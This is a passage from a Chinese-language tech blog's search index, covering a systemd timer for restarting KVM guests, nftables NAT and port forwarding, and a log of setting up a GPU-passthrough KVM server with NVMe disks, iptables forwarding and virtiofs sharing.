之后每 5 分钟运行一次 Type=oneshot # 表示脚本只执行一次并退出，非常适合自动任务 激活定时器： 12systemctl daemon-reloadsystemctl enable --now vm-autostart.timer 说明：和常规 long-running 的服务不同，看状态时，.service 为 inactive，.timer 应为 active（waiting），计时等待下次触发。 3. 查看日志 可通过如下命令查看服务执行和 logger 输出的日志： 查看服务日志： 1journalctl -u vm-autostart.service 查看 logger 输出（使用 Tag 检索）: 1journalctl -t VM_AUTOSTART 小结： 配合 systemd 定时器，实现 KVM 虚拟机宕机自动检测与重启，脚本简洁易扩展，日志也便于追溯。如果有更精细化需求，也可以改写成 Python 或用 ansible playbook 实现。","link":"/2025/04/19/2025-4-19-systemd-practic/"},{"title":"nftables 实践——替代 iptables","text":"nftables 作为 iptables 的接班人，在实际使用中也确实感受到了它的简洁、优雅，最重要的是装b！ 1. 应用场景 以前用 iptables 常见的需求： 让具有私有 IP 的 VM 访问外网（masquerade） 将 VM 的 SSH 端口转发到宿主指定端口 （可选）结合 fail2ban 做自动封禁（ps：据说有个 reaction 是 fail2ban 的轻量替代，但 fail2ban 已经足够傻瓜有效，所以没动力换） 2. 基本语法与结构 nft 命令一览： 1nft add | delete | flush table|chain|rule ... 保留了 Linux 的“四表五链”设计。详见 Netfilter_hooks（英文） 实际用时，大多只关心 ip 协议族，所以可以省略（默认即为 ip） 创建表 (table) 后可定义链 (chain)，主要关注入口（prerouting）与出口（postrouting） 虽然这些属于 nat 表的链，但为了可读性、可维护性也可以直接用 filter 表，不影响效果 rule 语法需指定 table/chain，然后写具体 statement statement 比较灵活，需要结合实际查阅文档或 man nft 页面（详见 nft.8#STATEMENTS） 3. 实践案例 (1) 让 VM 访问外网（私有 IP NAT 出口） 实现 NAT 出口最常用的就是 masquerade，流程对应 postrouting 阶段： 1nft add rule nat postrouting masquerade 或带表名完整示例（首次需先建表/链）： 123nft add table natnft add chain nat postrouting '{ type nat hook postrouting priority 100; }'nft add rule nat postrouting masquerade (2) SSH 端口转发 比如将宿主 12221 端口流量转发到内网 VM 的 22 端口： 1nft add rule nat prerouting tcp dport 12221 dnat to 192.168.1.101:22 (3) 关于表名与链名的灵活性 nft 规则中的 table 和 chain 名字其实没有强制要求，随意起名即可。例如可以用 小明、小红替代： 123nft add table xiaomingnft add chain xiaoming xiaohong '{ type nat hook prerouting priority 0; }'nft add rule xiaoming xiaohong tcp dport 12221 dnat to 192.168.1.101:22 作用完全一致。 另外注意：即使在 ssh 会话过程中删除掉该 rule，也不会立即使已建立连接断开。 提示：nftables 默认配置文件通常位于 /etc/nftables.conf，重启后会自动加载。临时添加的配置也可以用 nft list ruleset &gt; /etc/nftables.conf 备份。 4. 小结与感想 只有简单了解并动手试过，你才会发现：nft 比 iptables 更现代，也确实更清爽易用。 statement 和匹配规则更直观，灵活性强。 个人实际体验很友好，尤其便于批量管理和自动化。 参考资料 ArchWiki: nftables Gentoo Wiki: nftables/Examples","link":"/2025/04/19/2025-4-19-nftables/"},{"title":"服务器 KVM 虚拟化部署记录","text":"公司新到一批 8 卡 48 GB RTX 4090 服务器，用于深度学习任务的多租户调度。本文记录从系统安装、磁盘分区、GPU 直通到虚拟机克隆全过程中踩过的坑与解决方案，以备后查，也希望能给同样需求的同学一些参考。 1. virt-install 镜像加载报错 初次执行 1virt-install ... --boot hd ... 却收到 123ERRORAn install method must be specified(--location URL, --cdrom CD/ISO, --pxe, --import, --boot hd|cdrom|...) 原因是仅指定 --boot hd 并不足以告诉 libvirt 安装介质 从何而来。 在命令末尾补一个 “空导入” 即可解决： 1--import 等于告诉 virt-install：磁盘里已有系统，把它直接拿来启动即可。 2. CUDA 与 Anaconda 环境变量陷阱 最常见的错法是把 PATH 写成硬编码： 1export PATH=/usr/local/cuda-12.4/bin:/usr/local/sbin:/usr/bin 这样一旦 shell 里已有 PATH，会被完全覆盖。推荐写成如下“追加”形式： 12echo 'export PATH=/usr/local/cuda-12.4/bin${PATH:+:${PATH}}' &gt;&gt; ~/.bashrcecho 'export LD_LIBRARY_PATH=/usr/local/cuda-12.4/lib64${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}' &gt;&gt; ~/.bashrc 再次登录即可生效。 3. 服务器硬件与基础信息 CPU：2× Intel Xeon 8452Y（共 64C128T） RAM：1 TB SSD：2× 3.84 TB NVMe GPU：8× RTX 4090 48 GB 快速验证： 123nproc # ==&gt; 128free -h | awk '/^Mem:/ {print $2}' # ==&gt; ~1012Glsblk -d -o NAME,SIZE,MODEL | grep nvme GPU bus ID： 12lspci -nn | grep -i nvidia# 01:00.0, 26:00.0, 41:00.0, 61:00.0, 81:00.0, a1:00.0, c1:00.0, e1:00.0 4. NVMe 分区与挂载 1234567891011parted /dev/nvme0n1 &lt;&lt; 'EOF'mklabel gptmkpart primary 0% 100%quitEOFmkfs.ext4 -L data_nvme0 /dev/nvme0n1p1mkdir -p /mnt/nvme0echo 'UUID=5e9c468b-185f-48d8-b9f5-34c52e874d54 /mnt/nvme0 ext4 defaults 0 0' &gt;&gt; /etc/fstabmount -a &amp;&amp; df -h /mnt/nvme0 5. GPU 直通（VFIO） 指定要由 VFIO 接管的设备 ID： 1echo &quot;options vfio-pci ids=10de:2684,10de:22ba&quot; &gt; /etc/modprobe.d/vfio.conf 10de:2684：RTX 4090 显卡 10de:22ba：对应的 HD‑Audio 控制器 屏蔽宿主机自带驱动： 12echo -e &quot;blacklist nouveau\\nblacklist nvidia\\nblacklist snd_hda_intel&quot; &gt;&gt; /etc/modprobe.d/blacklist.confupdate-initramfs -u 热插拔示例（以 01:00.0 为例）： 1234567systemctl stop nvidia-persistencedmodprobe -r nvidia_drm nvidia_modeset nvidia_uvmecho vfio-pci &gt; /sys/bus/pci/devices/0000:01:00.0/driver_overrideecho 0000:01:00.0 &gt; /sys/bus/pci/drivers/vfio-pci/bind# 同理处理 01:00.1 (audio) 其余七张卡循环同样步骤即可。 6. 创建基础虚拟机并批量克隆 安装依赖与镜像： 123apt update &amp;&amp; apt install -y qemu-kvm libvirt-daemon virtinst bridge-utils virt-manager libguestfs-toolswget -P /var/lib/libvirt/images https://releases.ubuntu.com/jammy/ubuntu-22.04.5-live-server-amd64.isomkdir -p /mnt/nvme0/vm-storage 创建模板 VM（直通首张显卡）： 1234567virt-install --name vmbase \\ --os-variant ubuntu22.04 \\ --vcpus 16 \\ --memory 102400 \\ --disk path=/mnt/nvme0/vm-storage/vmbase.qcow2,size=400 \\ --location /var/lib/libvirt/images/ubuntu- 7. 网络与 SSH 隧道配置 1. iptables 端口转发 宿主机公网只有 22 端口，而每台 VM 都需要独立 SSH。做法是把宿主机的非标准端口映射到各 VM： 12345VM 列表192.168.122.171/24192.168.122.252/24…192.168.122.109/24 举例：把宿主机的 12223 → 192.168.122.167:22 123456# DNAT：修改目的地址iptables -t nat -A PREROUTING -p tcp --dport 12223 \\ -j DNAT --to-destination 192.168.122.167:22# FORWARD：放行转发流量iptables -A FORWARD -p tcp -d 192.168.122.167 --dport 22 -j ACCEPT 其余 VM 的端口依次重复。 2. 本地 SSH 隧道测试 12345# 建立本地 12223 → 宿主机 (125.71.97.167):12223 的隧道ssh -f -N -L 12223:192.168.122.167:22 luser@125.71.97.167# 直接指定映射端口登陆（例如 12226）ssh root@125.71.97.167 -p 12226 8.snd_hda_intel 占用音频接口导致直通失败 RTX 4090 带一条 PCI 子函数 10de:22ba (HD‑Audio)。若被 snd_hda_intel 抢占，VFIO 绑定会失败。处理步骤： 123456# 立即卸载modprobe -r snd_hda_intel# 永久屏蔽echo &quot;blacklist snd_hda_intel&quot; &gt;&gt; /etc/modprobe.d/blacklist.confupdate-initramfs -u 如重启后仍有其它模块占用，可再执行一次： 1modprobe -r nvidia_drm nvidia_modeset nvidia_uvm nvidia snd_hda_intel 可用 lspci -k -s &lt;bus-id&gt; 查看当前驱动归属： 1lspci -k -s 23:00.0 9. 后期磁盘扩容与挂载流程 查看新增磁盘 1lsblk 格式化（如 /dev/nvme0n1p1） 12umount /drive1 # 若已挂载mkfs.ext4 /dev/nvme0n1p1 获取 UUID 1blkid /dev/nvme0n1p1 创建挂载点并挂载 12mkdir -p /mnt/nvme0mount /dev/nvme0n1p1 /mnt/nvme0 永久写入 /etc/fstab 123nano /etc/fstab# 例：UUID=2b5da89f-81e8-4e8f-a233-5555e621203f /mnt/nvme1 ext4 defaults 0 0 验证 12mount -adf -h /mnt/nvme* 10.virtiofs 主机 ↔︎ 虚拟机高速共享 nfs 简单但延迟高；内核 ≥ 5.14 + libvirt ≥ 8.0 可直接用 virtiofs，性能接近本机 I/O。 主要参考文档 https://libvirt.org/kbase/virtiofs.html 修改 VM XML（示例片段）： 1234567891011121314151617&lt;domain type='kvm'&gt; … &lt;memoryBacking&gt; &lt;source type='memfd'/&gt; &lt;access mode='shared'/&gt; &lt;/memoryBacking&gt; &lt;devices&gt; … &lt;filesystem type='mount' accessmode='passthrough'&gt; &lt;driver type='virtiofs' queue='1024'/&gt; &lt;source dir='/mnt/nvme0/share'/&gt; &lt;target dir='shared_folder_tag'/&gt; &lt;/filesystem&gt; … &lt;/devices&gt;&lt;/domain&gt; 虚拟机内部挂载： 12mount -t virtiofs shared_folder_tag /mnt/sharedcp -r /mnt/shared/data /root/ 11. 总结 至此，8 卡 RTX 4090 KVM 集群 已完成： NVMe 分区与挂载 VFIO 直通显卡 + HD‑Audio Base VM 制作、批量克隆 iptables 端口映射 + 本地 SSH 隧道 驱动占用、磁盘扩容、virtiofs 文件共享等细节优化 过程中遇到的所有坑、完整命令与验证方式均已记录。如有疑问或更优实践，欢迎留言交流。","link":"/2025/04/19/2025-4-19-Gpu-go-through/"}],"tags":[{"name":"算法","slug":"算法","link":"/tags/%E7%AE%97%E6%B3%95/"},{"name":"MST","slug":"MST","link":"/tags/MST/"},{"name":"DP","slug":"DP","link":"/tags/DP/"},{"name":"并查集","slug":"并查集","link":"/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"},{"name":"最短路","slug":"最短路","link":"/tags/%E6%9C%80%E7%9F%AD%E8%B7%AF/"},{"name":"leetcode","slug":"leetcode","link":"/tags/leetcode/"},{"name":"algorithm","slug":"algorithm","link":"/tags/algorithm/"},{"name":"并发","slug":"并发","link":"/tags/%E5%B9%B6%E5%8F%91/"},{"name":"TODO","slug":"TODO","link":"/tags/TODO/"},{"name":"intro","slug":"intro","link":"/tags/intro/"},{"name":"btree","slug":"btree","link":"/tags/btree/"},{"name":"font","slug":"font","link":"/tags/font/"},{"name":"typescript","slug":"typescript","link":"/tags/typescript/"},{"name":"函数式编程","slug":"函数式编程","link":"/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"},{"name":"java","slug":"java","link":"/tags/java/"},{"name":"动漫","slug":"动漫","link":"/tags/%E5%8A%A8%E6%BC%AB/"},{"name":"日记","slug":"日记","link":"/tags/%E6%97%A5%E8%AE%B0/"},{"name":"maven","slug":"maven","link":"/tags/maven/"},{"name":"shell","slug":"shell","link":"/tags/shell/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"cryptography","slug":"cryptography","link":"/tags/cryptography/"},{"name":"raft","slug":"raft","link":"/tags/raft/"},{"name":"go","slug":"go","link":"/tags/go/"},{"name":"debug","slug":"debug","link":"/tags/debug/"},{"name":"profile","slug":"profile","link":"/tags/profile/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"vim","slug":"vim","link":"/tags/vim/"},{"name":"网络","slug":"网络","link":"/tags/%E7%BD%91%E7%BB%9C/"},{"name":"计算机基础","slug":"计算机基础","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"},{"name":"mysql","slug":"mysql","link":"/tags/mysql/"},{"name":"dns","slug":"dns","link":"/tags/dns/"},{"name":"tcp","slug":"tcp","link":"/tags/tcp/"},{"name":"c++","slug":"c","link":"/tags/c/"},{"name":"入门","slug":"入门","link":"/tags/%E5%85%A5%E9%97%A8/"},{"name":"开源","slug":"开源","link":"/tags/%E5%BC%80%E6%BA%90/"},{"name":"黑客文化","slug":"黑客文化","link":"/tags/%E9%BB%91%E5%AE%A2%E6%96%87%E5%8C%96/"},{"name":"redis","slug":"redis","link":"/tags/redis/"},{"name":"数据库","slug":"数据库","link":"/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"KVM","slug":"KVM","link":"/tags/KVM/"},{"name":"虚拟化","slug":"虚拟化","link":"/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}],"categories":[{"name":"编程","slug":"编程","link":"/categories/%E7%BC%96%E7%A8%8B/"},{"name":"Labs","slug":"编程/Labs","link":"/categories/%E7%BC%96%E7%A8%8B/Labs/"},{"name":"算法","slug":"编程/算法","link":"/categories/%E7%BC%96%E7%A8%8B/%E7%AE%97%E6%B3%95/"},{"name":"IT","slug":"IT","link":"/categories/IT/"},{"name":"CMU 15-213","slug":"编程/Labs/CMU-15-213","link":"/categories/%E7%BC%96%E7%A8%8B/Labs/CMU-15-213/"},{"name":"并发","slug":"编程/并发","link":"/categories/%E7%BC%96%E7%A8%8B/%E5%B9%B6%E5%8F%91/"},{"name":"扫盲","slug":"编程/扫盲","link":"/categories/%E7%BC%96%E7%A8%8B/%E6%89%AB%E7%9B%B2/"},{"name":"C","slug":"编程/C","link":"/categories/%E7%BC%96%E7%A8%8B/C/"},{"name":"数据结构","slug":"编程/数据结构","link":"/categories/%E7%BC%96%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"艺术","slug":"编程/艺术","link":"/categories/%E7%BC%96%E7%A8%8B/%E8%89%BA%E6%9C%AF/"},{"name":"函数式编程","slug":"编程/函数式编程","link":"/categories/%E7%BC%96%E7%A8%8B/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"},{"name":"hexo","slug":"hexo","link":"/categories/hexo/"},{"name":"Java","slug":"编程/Java","link":"/categories/%E7%BC%96%E7%A8%8B/Java/"},{"name":"生活","slug":"生活","link":"/categories/%E7%94%9F%E6%B4%BB/"},{"name":"MIT 6.Null","slug":"编程/Labs/MIT-6-Null","link":"/categories/%E7%BC%96%E7%A8%8B/Labs/MIT-6-Null/"},{"name":"MIT 6.824","slug":"编程/Labs/MIT-6-824","link":"/categories/%E7%BC%96%E7%A8%8B/Labs/MIT-6-824/"},{"name":"网络","slug":"IT/网络","link":"/categories/IT/%E7%BD%91%E7%BB%9C/"},{"name":"扫盲","slug":"编程/Java/扫盲","link":"/categories/%E7%BC%96%E7%A8%8B/Java/%E6%89%AB%E7%9B%B2/"},{"name":"数据库","slug":"IT/数据库","link":"/categories/IT/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"C++","slug":"编程/C","link":"/categories/%E7%BC%96%E7%A8%8B/C/"},{"name":"开源","slug":"编程/开源","link":"/categories/%E7%BC%96%E7%A8%8B/%E5%BC%80%E6%BA%90/"},{"name":"评论","slug":"生活/评论","link":"/categories/%E7%94%9F%E6%B4%BB/%E8%AF%84%E8%AE%BA/"},{"name":"日记","slug":"生活/日记","link":"/categories/%E7%94%9F%E6%B4%BB/%E6%97%A5%E8%AE%B0/"},{"name":"扫盲","slug":"编程/C/扫盲","link":"/categories/%E7%BC%96%E7%A8%8B/C/%E6%89%AB%E7%9B%B2/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"防火墙","slug":"Linux/防火墙","link":"/categories/Linux/%E9%98%B2%E7%81%AB%E5%A2%99/"}],"pages":[]}